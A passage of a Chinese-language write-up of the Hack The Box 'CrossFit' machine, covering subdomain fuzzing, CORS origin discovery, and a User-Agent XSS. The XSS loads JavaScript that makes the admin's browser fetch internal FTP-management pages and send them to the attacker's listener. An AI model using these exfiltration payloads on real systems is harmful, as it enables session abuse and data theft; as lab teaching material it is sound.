+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 10.10.14.13:2233</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://gym-club.crossfit.htb/security_threat/report.php</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 343</span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Security Report<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Logged XSS attempts<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>Timestamp<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>User Agent<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>IP Address<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先跟着wp走吧~</p>
+<h3 id="同源信息收集"><a href="#同源信息收集" class="headerlink" title="同源信息收集"></a>同源信息收集</h3><p>因为目录爆破没找到啥可通过<code>XMLHttpRequests</code>利用的，所以把目标指向子域，这里通过 <a target="_blank" rel="noopener" href="https://github.com/xmendez/wfuzz">wfuzz</a> 进行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H <span class="string">&quot;Host: FUZZ.crossfit.htb&quot;</span> --hh 10701 http://10.10.10.208</span><br></pre></td></tr></table></figure>
+
+<p>其中 </p>
+<ul>
+<li><p>字典 kali有 <code>sudo find / | grep subdomains-top1mil-110000.txt</code></p>
+</li>
+<li><p>FUZZ 是占位符，字典要替换的部分</p>
+</li>
+<li><p>–hh 是隐藏 Chars部分，即页面内容的字符，这里隐藏 Apache页面返回 10701字符的结果，如果不隐藏会出现一堆 Apache 页面的结果 （</p>
+</li>
+<li><p>原来 http 的 header Host 字段是干这个用的，apache等中间件通过Host来匹配对应的虚拟主机 （</p>
+</li>
+</ul>
+<p>不过扫描结果好像没啥有用的.. 有返回的返回码都是400（可能请求频率太快了）</p>
+<p>仔细一想，既然我们要跨源请求，直接找子域名肯定行不通的，由于同源策略的原因，就算管理员访问了带有XSS代码的页面，浏览器肯定不让xhr接收源B的返回信息，直接拦截。所以现在目标变成了：找到一个子域名，能让gym-club.crossfit.htb 跨源请求，这样才能把信息待会给我们。</p>
+<p>但问题是，，如何才能找到这个子域名…</p>
+<p>WP有个很骚的想法：我们要找的子域名如果能让 gym-club.crossfit.htb 跨源请求，那么 gym-club.crossfit.htb 是否也能被我们要找的子域名跨源请求呢？</p>
+<p>知道这个有啥用呢？根据同源策略，如果源A可以跨源请求源B，那么在源A跨源请求源B设置HTTP请求头的<code>Origin</code>字段为源B的域名（这个和用户浏览器在源B站向源A站发送请求的数据包是一样的），源B的HTTP返回包 <code>Access-Control-Allow-Origin</code> 字段会显示 源B 的域名，这样用户浏览器在源B向源A请求获取返回数据时，浏览器看到  <code>Access-Control-Allow-Origin</code> 字段为源B的域名（源B请求后端，Allow-Origin源B，不就同源了），就不会拦截，可正常接口到数据。</p>
+<blockquote>
+<p><strong>注意:</strong> 这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站点请求的网站无需为这一新的 HTTP 访问控制特性担心。</p>
+<p>– 摘自 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a></p>
+</blockquote>
+<p>其实很好理解，好比用户在源A前端通过xhr发送请求至源A后端，同源嘛，那<code>Origin</code>就是源A嘛，源A后端看到这个<code>Orgin</code>返回的  <code>Access-Control-Allow-Origin</code> 为源A，同源了，浏览器能正常接收数据，没问题。那源B前端通过xhr发送请求至源A后端，Origin是源B，然后返回的  <code>Access-Control-Allow-Origin</code> 为源B，也就是源B前端请求，后端返回源B，也同源，浏览器能正常接收数据。</p>
+<p>当然这个是要在源A的后端代码或配置文件配置的，即哪些源是我们可信的。</p>
+<p>也就是说，找到同源的子域，我们的XSS就可以利用了！因为如果能找到这个子域名，gym-club.crossfit.htb 向子域发出的 xhr是同源的，能正常获取数据，待 <code>xmlhttp.readyState==4</code> ，即下载操作已完成时，就可以通过 <code>responseText</code> 获取返回的数据了，就我们就可以获取我们无权限或无法直接访问到的页面的内容啦。</p>
+<p>那具体如何做呢？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H <span class="string">&quot;Origin: http://FUZZ.crossfit.htb&quot;</span> --filter <span class="string">&quot;r.headers.response~&#x27;Access-Control-Allow-Origin&#x27;&quot;</span> http://gym-club.crossfit.htb/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>–filter 中的 <code>str1~str2</code> 表示<code>str2</code>是否在<code>str1</code>中<sup>[5]</sup>，即表示使用源 <code>http://xxx.crossfit.htb</code> 访问 <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a> ，如果 Access-Control-Allow-Origin 为 <code>http://xxx.crossfit.htb</code> ，说明源 <code>http://xxx.crossfit.htb</code> 可以跨源请求<a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a> ，且用户在浏览器端可正常接口 <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a>  返回的数据。</li>
+<li>那为啥不是 <code>r.headers.response~&#39;Access-Control-Allow-Origin: http://FUZZ.crossfit.htb</code> ? 正常来说，如果服务端没配置这个源访问，直接不会返回这个字段。匹配字段短点，速度也快点，虽然加上更严谨 （</li>
+<li>PS: <code>Origin: </code> 记得别漏了 <code>http://</code>开头…不然服务端不会返回 <code>Access-Control-Allow-Origin:</code> </li>
+</ul>
+<p><img src="/img/htb-crossfit/image-20210812230746214.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812230746214.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812230746214"></p>
+<p>好耶！也就是说 <a target="_blank" rel="noopener" href="http://ftp.crossfit.htb/">http://ftp.crossfit.htb</a> 这个站是存在的</p>
+<p><img src="/img/htb-crossfit/image-20210811234123168.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210811234123168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210811234123168"></p>
+<p>把host文件更新一波</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208 gym-club.crossfit.htb ftp.crossfit.htb</span><br></pre></td></tr></table></figure>
+
+<p>访问一下发现还是 apache 默认页面</p>
+<p><img src="/img/htb-crossfit/image-20210811235550733.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210811235550733.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210811235550733"></p>
+<p>应该是这个域名只有内网才能访问，不过问题不大，我们可以让管理员帮我们去访问！</p>
+<h3 id="XSS-gt-CSRF"><a href="#XSS-gt-CSRF" class="headerlink" title="XSS -&gt; CSRF"></a>XSS -&gt; CSRF</h3><p>之前做过类似的，通过 <a href="https://tari.moe/2021/04/26/xssrf/i">XSS+XHR+SSRF 打 REDIS</a> ，这里其实也是差不多，说是 XSS+CSRF，理解成 XSS+SSRF也是没问题的，毕竟是让管理员帮我们请求内网，即我们无法访问的资源嘛。</p>
+<p>构造 js 代码，这里为了方便（UA写一大串也不美观，下面 IP 变为 10.10.14.11 是因为openvpn断了，所以我本机IP变了），把代码保存至 <code>payload1.js</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.11:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    xhr2.send(<span class="built_in">this</span>.responseText); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>上述代码用处为让管理员帮我们请求 <code>http://ftp.crossfit.htb</code> ，并把源码返回给我们，其中 <code>open()</code> 第三个参数为是否进行异步操作，默认为<code>true</code>，如果值为<code>false</code>，<code>send()</code>方法直到收到答复前不会返回<sup>[6]</sup></p>
+<p>起一个HTTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>然后获取返回数据为 2233 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2233</span><br></pre></td></tr></table></figure>
+
+<p>构造UA</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;img src=x onerror=&quot;document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//10.10.14.11/payload1.js&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？）</p>
+<p><img src="/img/htb-crossfit/image-20210812003015028.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812003015028.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812003015028"></p>
+<p>成功获取源码</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.14.11:2233</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://gym-club.crossfit.htb/security_threat/report.php</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>886</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://gym-club.crossfit.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>&gt;</span> Create New Account<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>No<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Creation Date<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">width</span>=<span class="string">&quot;280px&quot;</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>看 Referer 字段，原来管理员一直在看我们目录爆破出来 <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/security_threat/report.php">http://gym-club.crossfit.htb/security_threat/report.php</a> 路径</p>
+<p>源码本地打开</p>
+<p><img src="/img/htb-crossfit/image-20210813000115657.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210813000115657.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210813000115657"></p>
+<p>原来如此，原来是，管理ftp服务帐号的，怪不得，ftp的openssl信息里有 gym-club.crossfit.htb 域名相关的，，原来是一个网站一个ftp帐号之类的？</p>
+<p>如果是的话，我们就可以通过构造数据包，创建一个ftp帐号，然后应该就可以访问网站根目录，在上传一句话getshell，计划通~</p>
+<p>payload2.js 改为（至于为啥不像之前用POST而用GET，这里遇到了个问题，见<a href="#1%E3%80%81HTTP%E6%9C%8D%E5%8A%A1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%A5%E8%8E%B7%E5%8F%96payload2.js%EF%BC%8C%E4%BD%86nc%E5%B0%B1%E6%98%AF%E6%8E%A5%E6%94%B6%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E6%8E%A5%E6%94%B6%E7%AB%8B%E5%88%BB%E6%96%AD%E5%BC%80">遇到的问题1</a>）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">true</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210814115200480.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814115200480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814115200480"></p>
+<p>这里接收到的为base64编码后的，即 <code>JavaScript</code> 的 <code>btoa</code>方法</p>
+<p>代码如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Add New Account<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span>&gt;</span> Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;z9lTdbVfj0SAZjWoyUWLoWPEnRTXesPM2rt4n8No&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span 